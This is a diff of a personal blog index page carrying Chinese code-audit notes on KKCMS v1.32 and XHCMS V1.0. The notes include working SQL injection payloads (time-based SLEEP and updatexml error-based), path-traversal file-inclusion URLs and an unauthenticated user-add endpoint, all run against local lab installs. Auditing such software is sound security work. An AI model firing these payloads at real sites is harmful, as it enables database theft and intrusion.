@@ -180,7 +180,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/08/12/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/touxiang.jpg">
@@ -198,7 +198,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/08/12/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">未命名</a>
+          <a href="/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">Beescms V4.0审计</a>
         </h2>
 
         <div class="post-meta-container">
@@ -209,7 +209,23 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-08-12 11:39:06" itemprop="dateCreated datePublished" datetime="2022-08-12T11:39:06+08:00">2022-08-12</time>
+      <time title="创建时间：2022-08-11 23:34:36" itemprop="dateCreated datePublished" datetime="2022-08-11T23:34:36+08:00">2022-08-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-08-12 11:47:23" itemprop="dateModified" datetime="2022-08-12T11:47:23+08:00">2022-08-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
     </span>
 
   
@@ -295,7 +311,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">未命名</a>
+          <a href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">Beescms V4.0审计</a>
         </h2>
 
         <div class="post-meta-container">
@@ -306,7 +322,23 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-08-11 16:19:12" itemprop="dateCreated datePublished" datetime="2022-08-11T16:19:12+08:00">2022-08-11</time>
+      <time title="创建时间：2022-08-11 23:34:36" itemprop="dateCreated datePublished" datetime="2022-08-11T23:34:36+08:00">2022-08-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-08-12 11:48:25" itemprop="dateModified" datetime="2022-08-12T11:48:25+08:00">2022-08-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
     </span>
 
   
@@ -319,11 +351,11 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>KKCMS v1.32审计</p>
-<p>前台注入1<br><a target="_blank" rel="noopener" href="http://127.0.0.1/kkcms/bplay.php?play=a">http://127.0.0.1:80/kkcms/bplay.php?play=a</a> AND (SELECT 6254 FROM (SELECT(SLEEP(5)))hZmf)</p>
-<p>前台注入2<br><a target="_blank" rel="noopener" href="http://127.0.0.1/kkcms/ucenter/active.php?verify=a&#39;">http://127.0.0.1:80/kkcms/ucenter/active.php?verify=a&#39;</a> AND (SELECT 7219 FROM (SELECT(SLEEP(5)))VMtB) AND ‘qLKJ’&#x3D;’qLKJ</p>
-<p>未授权添加<br><a target="_blank" rel="noopener" href="http://127.0.0.1/kkcms/ucenter/cms_user_add.php">http://127.0.0.1/kkcms/ucenter/cms_user_add.php</a></p>
-<p>后台注入<br><a target="_blank" rel="noopener" href="http://127.0.0.1/kkcms/admin/cms_ad_edit.php?id=1">http://127.0.0.1:80/kkcms/admin/cms_ad_edit.php?id=1</a> AND (SELECT 3894 FROM (SELECT(SLEEP(5)))RJzc)</p>
+          <p>#KKCMS v1.32审计</p>
+<p>##前台注入1<br><a target="_blank" rel="noopener" href="http://127.0.0.1/kkcms/bplay.php?play=a">http://127.0.0.1:80/kkcms/bplay.php?play=a</a> AND (SELECT 6254 FROM (SELECT(SLEEP(5)))hZmf)</p>
+<p>##前台注入2<br><a target="_blank" rel="noopener" href="http://127.0.0.1/kkcms/ucenter/active.php?verify=a&#39;">http://127.0.0.1:80/kkcms/ucenter/active.php?verify=a&#39;</a> AND (SELECT 7219 FROM (SELECT(SLEEP(5)))VMtB) AND ‘qLKJ’&#x3D;’qLKJ</p>
+<p>##未授权添加用户<br><a target="_blank" rel="noopener" href="http://127.0.0.1/kkcms/ucenter/cms_user_add.php">http://127.0.0.1/kkcms/ucenter/cms_user_add.php</a></p>
+<p>##后台注入<br><a target="_blank" rel="noopener" href="http://127.0.0.1/kkcms/admin/cms_ad_edit.php?id=1">http://127.0.0.1:80/kkcms/admin/cms_ad_edit.php?id=1</a> AND (SELECT 3894 FROM (SELECT(SLEEP(5)))RJzc)</p>
 <p>这套一堆都是重复的注入</p>
 <p>没意思 不写了</p>
 
@@ -352,7 +384,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/08/11/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/">
+    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/touxiang.jpg">
@@ -370,7 +402,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/08/11/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">未命名</a>
+          <a href="/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">熊海CMS V1.0审计</a>
         </h2>
 
         <div class="post-meta-container">
@@ -380,9 +412,24 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2022-08-11 09:28:25 / 修改时间：16:19:29" itemprop="dateCreated datePublished" datetime="2022-08-11T09:28:25+08:00">2022-08-11</time>
+      <time title="创建时间：2022-08-10 23:34:36" itemprop="dateCreated datePublished" datetime="2022-08-10T23:34:36+08:00">2022-08-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-08-12 11:48:22" itemprop="dateModified" datetime="2022-08-12T11:48:22+08:00">2022-08-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
     </span>
 
   
@@ -396,12 +443,12 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1 id="熊海CMS-V1-0审计"><a href="#熊海CMS-V1-0审计" class="headerlink" title="熊海CMS V1.0审计"></a>熊海CMS V1.0审计</h1><p>vscode+phpsuty</p>
-<p>熊海CMS<br><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/admin/?r=login">http://127.0.0.1/xhcms/admin/?r=login</a><br>SQL注入</p>
+<p>##SQL注入<br><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/admin/?r=login">http://127.0.0.1/xhcms/admin/?r=login</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin*&amp;password=<span class="number">123456</span>&amp;login=yes</span><br></pre></td></tr></table></figure>
 
-<p>前台文件包含<br><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/index.php?r=../../phpinfo">http://127.0.0.1/xhcms/index.php?r=../../phpinfo</a><br>$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名<br>$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于index<br>include(‘files&#x2F;‘.$action.’.php’); &#x2F;&#x2F;载入相应文件</p>
-<p>后台文件包含<br><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo">http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo</a><br>$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名<br>$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于index<br>include(‘files&#x2F;‘.$action.’.php’); &#x2F;&#x2F;载入相应文件</p>
-<p>前台注入</p>
+<p>##前台文件包含<br><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/index.php?r=../../phpinfo">http://127.0.0.1/xhcms/index.php?r=../../phpinfo</a><br>$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名<br>$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于index<br>include(‘files&#x2F;‘.$action.’.php’); &#x2F;&#x2F;载入相应文件</p>
+<p>##后台文件包含<br><a target="_blank" rel="noopener" href="http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo">http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo</a><br>$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名<br>$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于index<br>include(‘files&#x2F;‘.$action.’.php’); &#x2F;&#x2F;载入相应文件</p>
+<p>##前台注入</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=content&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=software&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br></pre></td></tr></table></figure>
 
 <p>addslashes 防SQL注入 转义单引号 ‘  &#39;<br>$query &#x3D; “UPDATE content SET hit &#x3D; hit+1 WHERE id&#x3D;$id”; &#x2F;&#x2F;这里没用到单引号闭合 所以存在SQL注入</p>
